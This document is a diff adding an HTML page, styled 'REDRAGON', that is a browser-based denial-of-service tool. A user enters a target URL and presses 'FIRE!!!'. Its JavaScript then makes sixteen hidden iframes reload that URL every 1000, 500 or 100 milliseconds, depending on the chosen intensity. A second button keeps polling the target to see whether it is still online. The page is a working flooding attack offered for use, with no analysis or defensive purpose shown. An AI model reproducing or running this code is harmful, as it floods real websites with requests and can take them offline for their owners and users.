@@ -1,0 +1,140 @@
+<html>
+<div id="shopify-section-footer" class="shopify-section">
+  <footer class="site-footer" role="contentinfo">
+    <div class="page-width page-width02">
+      <ul>
+        <img class="logo-icon js lazyautosizes lazyloaded" src="http://haruneko.html.xdomain.jp/redragon.png">
+        <a href="javascript:void(0);" onclick="window.open('http://haruneko.html.xdomain.jp/dos.html','_blank')" style="text-decoration:none;" ><font size="40" color="red">Redragon</font></a>
+      </ul>
+      <meta name="viewport" content="width=device-width, initial-scale=1" />
+      <meta http-equiv="content-type" charset="UTF-8">
+      <title>REDRAGON</title>
+      <body background="http://haruneko.html.xdomain.jp/redrawall.png" style="background-size: cover;">
+        <div class="grid__item grid__item--collection-template medium-up--two-quarter">
+          <ul class="nav nav-pills card-header-pills p-2">
+            <li class="nav-item">
+              WERLCOME TO REDRAGONZONE
+            </li>
+          </ul>
+          <input type="text" id="url" style="width:80%" placeholder="URL" class="rounded border bg-gray-50 px-3 py-2 text-gray-800 outline-none ring-indigo-300 transition duration-100 focus:ring">
+          <input type="button" id="fireButton" value="FIRE!!!" class="btn feature-btn contact-btn">
+          <button id="checkStatusButton" class="btn newsletter__submit">攻撃先生存確認を常に表示(大抵失敗)</button>
+          <p id="statusDisplay"></p>
+          <form id="myForm">
+            <input type="radio" name="option" value="低設定">低設定
+            <input type="radio" name="option" value="中設定">中設定
+            <input type="radio" name="option" value="高設定">高設定
+          </form>
+        </div>
+      </div>
+      <div id="response"></div>
+      <iframe id="a" width="50" height="50" sandbox></iframe>
+      <iframe id="b" width="50" height="50" sandbox></iframe>
+      <iframe id="c" width="50" height="50" sandbox></iframe>
+      <iframe id="d" width="50" height="50" sandbox></iframe>
+      <iframe id="e" width="50" height="50" sandbox></iframe>
+      <iframe id="f" width="50" height="50" sandbox></iframe>
+      <iframe id="g" width="50" height="50" sandbox></iframe>
+      <iframe id="h" width="50" height="50" sandbox></iframe>
+      <iframe id="i" width="50" height="50" sandbox></iframe>
+      <iframe id="j" width="50" height="50" sandbox></iframe>
+      <iframe id="k" width="50" height="50" sandbox></iframe>
+      <iframe id="l" width="50" height="50" sandbox></iframe>
+      <iframe id="m" width="50" height="50" sandbox></iframe>
+      <iframe id="n" width="50" height="50" sandbox></iframe>
+      <iframe id="o" width="50" height="50" sandbox></iframe>
+      <iframe id="p" width="50" height="50" sandbox></iframe>
+      <div class="position-fixed bottom-0 end-0 p-3" style="z-index: 11">
+        <div id="liveToast" class="toast bg-dark" role="alert" aria-live="assertive" aria-atomic="true">
+          <div class="toast-header bg-dark">
+            <strong class="me-auto bg-dark">（＾＿＾）</strong>
+            <button type="button" class="btn-close" data-bs-dismiss="toast" aria-label="Close"></button>
+          </div>
+          <div class="toast-body bg-dark">
+            <h1 class="title"><font color="red"><strong>START</strong></font></h1>
+          </div>
+        </div>
+      </div>
+      <div id="iframe-container"></div>
+      <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js" integrity="sha384-C6RzsynM9kWDrMNeT87bh95OGNyZPhcTNXj1NW7RuBCsyN/o0jlpcV8Qyq46cDfL" crossorigin="anonymous"></script>
+      <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-T3c6CoIi6uLrA9TneNEoa7RxnatzjcDSCmG1MXxSR1GAsXEV/Dwwykc2MPK8M2HN" crossorigin="anonymous">
+      <link href="redragon.css" rel="stylesheet" type="text/css" media="all">
+      <script>
+        var toastTrigger = document.getElementById('fireButton')
+        var toastLiveExample = document.getElementById('liveToast')
+        if (toastTrigger) {
+          toastTrigger.addEventListener('click', function () {
+            var toast = new bootstrap.Toast(toastLiveExample)
+            toast.show()
+          })
+        }
+
+        function getSelectedInterval() {
+          var form = document.getElementById('myForm');     
+          var selectedValue;    
+          for (var i = 0; i < form.option.length; i++) {
+            if (form.option[i].checked) {
+              selectedValue = form.option[i].value;
+              break;
+            }
+          }
+          switch(selectedValue) {
+            case '低設定':
+              return 1000;
+            case '中設定':
+              return 500;
+            case '高設定':
+              return 100;
+          }
+        }
+
+        function sendGetRequest() {
+          var intervalValue = getSelectedInterval();
+          if (!intervalValue) {
+            document.getElementById('statusDisplay').textContent = 'ちゃんと入力しろ！！！！';
+            return;
+          }
+
+
+
+          var iframes = document.querySelectorAll('iframe[id^="a"], iframe[id^="b"], iframe[id^="c"], iframe[id^="d"], iframe[id^="e"], iframe[id^="f"], iframe[id^="g"], iframe[id^="h"], iframe[id^="i"], iframe[id^="j"], iframe[id^="k"], iframe[id^="l"], iframe[id^="m"], iframe[id^="n"], iframe[id^="o"], iframe[id^="p"]');
+          iframes.forEach((iframe) => {
+            setInterval(function () { 
+              iframe.src = document.getElementById("url").value;
+            }, intervalValue);
+          });
+        }
+
+        document.getElementById('fireButton').addEventListener('click', sendGetRequest);
+
+        document.getElementById('checkStatusButton').addEventListener('click', () => {
+          var intervalValue = getSelectedInterval();
+          var a = setInterval(function() {
+            const url = document.getElementById('url').value;
+            if (url) {
+              const xhr = new XMLHttpRequest();
+              xhr.open('GET', url, true);
+              xhr.onreadystatechange = function () {
+                if (xhr.readyState === 4) {
+                  if (xhr.status === 200) {
+                    document.getElementById('statusDisplay').textContent = `ステータス: ${xhr.status} (${xhr.statusText})`;
+                  } else {
+                    document.getElementById('statusDisplay').textContent = `エラー: ステータスコード ${xhr.status} (${xhr.statusText})`;
+                  }
+                }
+              };
+              xhr.onerror = function () {
+                document.getElementById('statusDisplay').textContent = `エラー: リクエストが失敗しました。`;
+              };
+              xhr.send();
+            } else {
+              document.getElementById('statusDisplay').textContent = 'ちゃんと入力しろ！！！！';
+            }
+          }, 1000);
+        });
+      </script>
+    </div>
+  </footer>
+</div>
+</body>
+</html>
